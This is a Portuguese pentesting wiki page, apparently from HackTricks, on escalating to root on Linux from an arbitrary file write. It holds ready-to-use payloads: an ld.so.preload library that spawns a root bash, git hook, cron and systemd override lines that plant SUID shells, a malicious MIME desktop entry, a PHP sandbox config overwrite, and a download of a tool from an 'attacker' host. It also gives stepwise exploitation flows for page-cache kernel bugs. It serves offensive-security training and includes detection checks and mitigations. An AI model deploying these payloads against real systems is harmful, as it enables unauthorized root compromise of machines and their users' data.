# Escrita Arbitrária de Arquivo como Root

### /etc/ld.so.preload

`/etc/ld.so.preload` é uma lista em todo o sistema de shared objects que o dynamic linker carrega antes de outros shared objects. O modo de execução segura aplica restrições adicionais ao preloading, portanto um caminho de biblioteca como `/tmp/pe.so` não é uma técnica universal para binários SUID.\
Se você puder criá-lo ou modificá-lo, um processo que carregar o arquivo carregará a biblioteca listada antes dos demais shared objects, permitindo a execução de código no contexto desse processo.<sup>[[12]](#references)</sup>

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** são scripts executáveis executados em eventos de um repositório, incluindo operações de commit e merge. Se um **script ou usuário privilegiado** realizar essas ações e um atacante puder **escrever na pasta `.git`**, o hook poderá ser usado para **escalada de privilégios**.<sup>[[13]](#references)</sup>

Por exemplo, é possível **gerar um script** em um repositório git, em **`.git/hooks`**, para que ele seja sempre executado quando um novo commit for criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Arquivos de Cron e tempo

Se você puder **escrever em arquivos relacionados ao cron que são executados pelo root**, geralmente poderá obter execução de código na próxima vez que o job for executado. Alvos interessantes incluem:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- O próprio crontab do root em `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Timers do `systemd` e os serviços que eles acionam

Verificações rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Caminhos comuns de abuso:

- **Adicionar um novo cron job do root** a `/etc/crontab` ou a um arquivo em `/etc/cron.d/`
- **Substituir um script** já executado por `run-parts`
- **Criar um backdoor no alvo de um timer existente** modificando o script ou binário que ele executa

Exemplo mínimo de payload de cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se você só puder escrever dentro de um diretório do cron usado por `run-parts`, coloque um arquivo executável lá:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` geralmente ignora nomes de arquivo que contêm pontos, portanto prefira nomes como `backup` em vez de `backup.sh`.<sup>[[15]](#references)</sup>
- Alguns sistemas usam timers do `systemd` em vez do cron clássico, mas a ideia de abuso é a mesma: **modificar o que o root executará posteriormente**.<sup>[[20]](#references)</sup>

### Arquivos de Service e Socket

Se você puder gravar em **arquivos de unidade do `systemd`** ou em arquivos referenciados por eles, poderá obter execução de código como root recarregando e reiniciando a unidade, ou aguardando o acionamento do caminho de ativação do service/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Alvos interessantes incluem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Substituições drop-in em `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binários de service referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Caminhos `EnvironmentFile=` graváveis carregados por um service executado como root

Verificações rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Caminhos comuns de abuso:

- **Sobrescrever `ExecStart=`** em uma unit de serviço pertencente ao root que você pode modificar
- **Adicionar um override de drop-in** com um `ExecStart=` malicioso e limpar o antigo primeiro
- **Adicionar um backdoor ao script/binário** já referenciado pela unit
- **Sequestrar um serviço ativado por socket** modificando o arquivo `.service` correspondente, que é iniciado quando o socket recebe uma conexão

Exemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Fluxo típico de ativação:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se você não puder reiniciar os serviços por conta própria, mas puder editar uma unidade ativada por socket, talvez só precise **aguardar uma conexão de cliente** para acionar a execução do serviço com backdoor como root.<sup>[[17]](#references)</sup>

### Sobrescrever um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons personalizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restrito** (por exemplo, `disable_functions=exec,system,...`). Se o código no sandbox ainda tiver **qualquer primitive de escrita** (como `file_put_contents`) e você puder acessar o **caminho exato do `php.ini`** usado pelo daemon, poderá **sobrescrever essa configuração** para remover as restrições e então enviar um segundo payload que será executado com privilégios elevados.<sup>[[2]](#references)</sup>

Fluxo típico:

1. O primeiro payload sobrescreve a configuração do sandbox.
2. O segundo payload executa o código, agora que as funções perigosas foram reativadas.

Exemplo mínimo (substitua pelo caminho usado pelo daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se o daemon for executado como root (ou validar usando paths pertencentes ao root), a segunda execução resulta em um contexto root. Isso é essencialmente **privilege escalation via config overwrite** quando o runtime em sandbox ainda consegue gravar arquivos.

### binfmt_misc

`binfmt_misc` expõe registros em `/proc/sys/fs/binfmt_misc`; cada registro associa um padrão de tipo de arquivo a um interpreter. O impacto nos privilégios depende de quem pode alterar o registro e de qual processo executa posteriormente o arquivo correspondente; portanto, verifique esses requisitos antes de tratá-lo como um possível caminho de privilege escalation.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Ambientes desktop usam associações MIME e entradas desktop para escolher um aplicativo para esquemas de URI; um atacante que possa gravar na configuração relevante por usuário e nos diretórios de entradas desktop pode redirecionar esses esquemas para um launcher sob seu controle. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os handlers de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), um clique do usuário pode invocar essa entrada desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root executando scripts/binários graváveis pelo usuário

Se um workflow privilegiado executar algo como `/bin/sh /home/username/.../script` (ou qualquer binário dentro de um diretório pertencente a um usuário sem privilégios), você pode sequestrá-lo:<sup>[[1]](#references)</sup>

- **Detecte a execução:** monitore os processos com pspy para capturar o root invocando caminhos controlados pelo usuário.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmar a possibilidade de escrita:** certifique-se de que tanto o arquivo-alvo quanto o diretório pertencem ao seu usuário e podem ser gravados por ele.
- **Sequestrar o alvo:** faça backup do binário/script original e coloque um payload que crie um shell SUID (ou execute qualquer outra ação como root); em seguida, restaure as permissões:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Acione a ação privilegiada** (por exemplo, pressionando um botão da UI que inicia o helper). Quando o root executar novamente o path sequestrado, obtenha a shell escalada com `./rootshell -p`.

### Modificação apenas do page cache de arquivos binários privilegiados

Alguns bugs do kernel não modificam o arquivo **no disco**. Em vez disso, eles permitem modificar apenas a **cópia no page cache de um arquivo legível**. Se você puder atingir um binário **setuid** ou executado de outra forma pelo **root**, a próxima execução poderá executar bytes controlados pelo atacante a partir da memória e escalar privilégios, mesmo que o hash do arquivo no disco permaneça inalterado.<sup>[[3]](#references)[[4]](#references)</sup>

É útil pensar nisso como uma **primitiva de escrita de arquivo somente em runtime**:<sup>[[3]](#references)</sup>

- **O disco permanece limpo**: o inode e os bytes no disco não mudam
- **A memória fica suja**: processos que leem/executam a página em cache obtêm o conteúdo modificado pelo atacante
- **O efeito é temporário**: a alteração desaparece após uma reinicialização ou a eviction do cache

Essa primitiva fica entre a **arbitrary file write** clássica e bugs mais antigos de **page-cache abuse**, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependia de uma race
- Dirty Pipe tinha restrições de posição de escrita
- Uma primitiva somente de page cache pode ser mais confiável se o path vulnerável fornecer escritas diretas em páginas file-backed em cache

#### Fluxo genérico de privesc

1. Obtenha uma primitiva do kernel capaz de escrever em **páginas file-backed do page cache**
2. Use-a contra um **binário privilegiado legível** ou outro arquivo executado pelo root
3. Acione a execução **antes que a página seja removida do cache**
4. Obtenha execução de código como root enquanto o arquivo no disco ainda parece inalterado

Alvos típicos de alto valor:

- Binários **setuid-root**
- Helpers iniciados por **serviços root**
- Binários normalmente executados a partir de **containers que compartilham o kernel/page cache do host**

#### Path de exemplo: AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) é um bom exemplo dessa classe. O path vulnerável estava na API de userspace de criptografia do Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` pode mover referências a páginas do page cache de um arquivo legível para a scatterlist TX de criptografia
- o path de decrypt in-place do `algif_aead` reutilizava os buffers de origem e destino
- `authencesn` então escrevia na região de tag de destino
- quando essa região ainda referenciava páginas file-backed obtidas via splice, a escrita era realizada no **page cache do arquivo-alvo**

Portanto, a técnica interessante não é o CVE em si, mas o padrão:

- **inserir páginas de cache file-backed em um subsistema do kernel**
- fazer o subsistema **tratá-las como saída gravável**
- acionar uma pequena sobrescrita controlada na memória

O PoC público usava **escritas repetidas de 4 bytes** para aplicar um patch em `/usr/bin/su` na memória e depois executá-lo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Path de exemplo: ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) mostra outra variante do mesmo padrão de **page-cache-only write-to-root**, mas desta vez o destino é o **decrypt IPsec ESP**, em vez de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

A técnica importante é a etapa de **metadata-laundering**:

- `splice()` coloca uma **página read-only file-backed do page cache** em um pacote ESP-in-UDP
- a mitigação original do DirtyFrag marcava esse skb com `SKBFL_SHARED_FRAG` para que `esp_input()` fizesse uma **cópia antes do decrypt**
- o netfilter `TEE` duplica o pacote por meio de `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- o clone mantém a **mesma referência à página física do page cache**, mas perde `SKBFL_SHARED_FRAG`
- `esp_input()` então trata o clone como seguro e executa o **decrypt in-place de `cbc(aes)`** sobre a página file-backed

Assim, a lição para o reviewer é mais ampla que o CVE: se uma mitigação depende de **metadados de skb/página** para decidir se uma operação precisa fazer uma cópia antes, qualquer **path de clone/cópia que preserve a página subjacente, mas remova os metadados**, pode reabrir silenciosamente a primitiva de escrita.

Fluxo de exploração típico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obter **`CAP_NET_ADMIN` dentro de um network namespace privado**
2. ativar o loopback e instalar uma **regra `TEE` de netfilter** em `mangle/OUTPUT`
3. instalar **SAs de transporte XFRM ESP** via `NETLINK_XFRM`
4. codificar cada palavra-alvo de 4 bytes no campo `seq_hi` da SA (o word-selection trick do DirtyFrag)
5. enviar o pacote ESP-in-UDP obtido via splice para que o **clone do TEE** alcance `esp_input()` e faça o decrypt **in-place**
6. repetir até que a cópia no page cache de `/usr/bin/su` ou de outro executável privilegiado contenha código controlado pelo atacante

Operacionalmente, o impacto é o mesmo do exemplo com `AF_ALG`: o arquivo no disco permanece limpo, mas `execve()` consome os **bytes modificados do page cache** e fornece root.<sup>[[8]](#references)[[9]](#references)</sup>

Verificações úteis de exposição para essa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
A redução da attack surface a curto prazo também é específica ao caminho neste caso: fazer upgrade para um kernel que inclua `48f6a5356a33` corrige o clone path, enquanto bloquear o autoload de `xt_TEE` remove o **flag-laundering step** e bloquear `esp4` / `esp6` remove o **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposição e hunting

Se você suspeitar desta classe de bug, não dependa apenas de verificações de integridade do disco. Verifique também:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Os valores de configuração abaixo distinguem uma interface carregável de uma incorporada ao kernel; as regras de compilação de crypto mapeiam `CONFIG_CRYPTO_USER_API_AEAD` para `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` pode ser carregável/descarregável como um módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: a interface é incorporada ao kernel
- binários setuid são bons alvos porque um patch que afete apenas o page cache pode ser suficiente para transformar um foothold local em root

#### Redução da superfície de ataque para o caminho `algif_aead`

Se a interface vulnerável for fornecida por um módulo carregável:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se for compilado no kernel, algumas divulgações relataram bloquear o caminho de init com:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Esse tipo de mitigação também vale a pena ser lembrado para outros kernel LPEs: se a exploitation depender de uma interface opcional específica, desabilitar ou colocar essa interface na blacklist pode interromper o caminho de exploração mesmo antes que uma atualização completa do kernel esteja disponível.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking de um script executado como root em um diretório do PaperCut gravável pelo usuário](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ sobre Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgação da Openwall oss-security sobre CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correção do Linux stable: crypto: algif_aead - Reverter para operação out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory da CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositório / README do DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecando e explorando a variante de Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correção do Linux: net: skb: preservar `SKBFL_SHARED_FRAG` em `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigação anterior do Linux: definir `SKBFL_SHARED_FRAG` para pacotes UDP unidos (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — página de manual do Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — página de manual do Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentação do Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associações de aplicações MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Especificação de Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Especificação de Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguagem Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile de crypto do Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilidade de page cache do Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
